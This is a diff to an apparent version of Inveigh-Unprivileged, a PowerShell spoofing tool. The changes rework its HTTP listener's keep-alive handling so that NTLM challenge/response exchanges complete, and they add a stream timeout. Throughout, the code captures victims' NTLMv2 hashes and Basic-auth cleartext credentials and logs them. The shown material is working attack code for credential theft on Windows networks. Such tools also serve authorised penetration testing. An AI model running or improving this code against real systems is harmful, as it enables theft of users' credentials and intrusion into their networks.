@@ -80,7 +80,9 @@ Default = 80: Specify a TCP port for the HTTP listener.
 
 .PARAMETER HTTPAuth
 Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type. This setting does not
-apply to wpad.dat requests.
+apply to wpad.dat requests. Note that Microsoft has changed the behavior of WDAP through NBNS in the June 2016
+patches. A WPAD enabled browser may now trigger NTLM authentication after sending out NBNS requests to random
+hostnames and connecting to the root of the web server.
 
 .PARAMETER HTTPBasicRealm
 Specify a realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.
@@ -649,7 +651,7 @@ if($inveigh.status_output)
                     $inveigh.status_queue.RemoveAt(0)
                 }
 
-                "Run Stop-Inveigh to stop running Inveigh functions"
+                "Run Stop-Inveigh to stop Inveigh-Unprivileged"
                 {
                     Write-Warning($inveigh.status_queue[0])
                     $inveigh.status_queue.RemoveAt(0)
@@ -806,16 +808,17 @@ $HTTP_scriptblock =
         $HTTP_WPAD_response = "function FindProxyForURL(url,host){return `"DIRECT`";}"
     }
 
+    $HTTP_client_close = $true
+
     :HTTP_listener_loop while ($inveigh.unprivileged_running)
     {
-
-        $TCP_request = $NULL
+        $TCP_request = ""
         $TCP_request_bytes = New-Object System.Byte[] 1024
 
         while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
         {
 
-            Start-Sleep -m 100
+            Start-Sleep -m 10
 
             if(!$inveigh.unprivileged_running)
             {
@@ -824,13 +827,16 @@ $HTTP_scriptblock =
         
         }
 
-        if(!$HTTP_client.Connected)
+        if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.unprivileged_running)
         {
             $HTTP_client = $HTTP_listener.AcceptTcpClient() # will block here until connection 
-	        $HTTP_stream = $HTTP_client.GetStream() 
+	        $HTTP_stream = $HTTP_client.GetStream()
         }
 
-        while ($HTTP_stream.DataAvailable)
+        $HTTP_stream_timeout = New-TimeSpan -Seconds 2
+        $HTTP_stream_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+
+        while($HTTP_stream.DataAvailable -and $HTTP_stream_stopwatch.Elapsed -lt $HTTP_stream_timeout)
         {
             $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)
         }
@@ -893,6 +899,7 @@ $HTTP_scriptblock =
                 {
                     $HTTP_response_status_code = 0x34,0x30,0x31
                     $NTLM = NTLMChallengeBase64
+                    $HTTP_client_close = $false
                 }
                 elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                 {
@@ -954,9 +961,6 @@ $HTTP_scriptblock =
 
                         }
 
-                        $HTTP_response_status_code = 0x32,0x30,0x30
-                        $HTTP_client_close = $true
-                        $NTLM_challenge = ""
                     }
                     else # NTLMv2
                     {         
@@ -967,7 +971,7 @@ $HTTP_scriptblock =
                         if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                         {
                             $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $source_IP ($HTTP_NTLM_host_string)")])
-                            $inveigh.NTLMv2_list.Add($inveigh.HTTP_NTLM_hash)
+                            $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash)
                         
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                             {
@@ -1007,6 +1011,7 @@ $HTTP_scriptblock =
                 else
                 {
                     $NTLM = "NTLM"
+                    $HTTP_client_close = $false
                 }
 
             }
@@ -1016,6 +1021,7 @@ $HTTP_scriptblock =
                 $HTTP_response_phrase = 0x4f,0x4b
                 $authentication_header = $authentication_header -replace 'Basic ',''
                 $cleartext_credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($authentication_header))
+                $HTTP_client_close = $true
                 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $source_IP")])
                 $inveigh.cleartext_file_queue.Add($cleartext_credentials)
                 $inveigh.cleartext_list.Add($cleartext_credentials)
@@ -1026,6 +1032,18 @@ $HTTP_scriptblock =
                     $inveigh.console_queue.Add("Basic auth cleartext credentials written to " + $inveigh.cleartext_out_file)
                 }
                  
+            }
+            else
+            {
+                if($HTTPAuth -ne 'Anonymous' -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -ne 'Anonymous'))
+                {
+                    $HTTP_client_close = $false
+                }
+                else
+                {
+                    $HTTP_client_close = $true
+                }
+
             }
 
             $HTTP_timestamp = Get-Date -format r
@@ -1080,7 +1098,6 @@ $HTTP_scriptblock =
                 $HTTP_message_bytes = 0x0d,0x0a
                 $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
                 $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
-                $HTTP_client_close = $true
 
                 $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                                     $HTTP_response_status_code +
@@ -1109,7 +1126,6 @@ $HTTP_scriptblock =
                 $HTTP_message_bytes = 0x0d,0x0a
                 $HTTP_content_length_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
                 $HTTP_message_bytes += [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
-                $HTTP_client_close = $true
 
                 $HTTP_response = 0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20 +
                                     $HTTP_response_status_code +
@@ -1149,7 +1165,11 @@ $HTTP_scriptblock =
 
             }
 
-            $HTTP_client_close = $false
+        }
+        else
+        {
+            $HTTP_client.Close()
+            $HTTP_client_close = $true
         }
     
     }
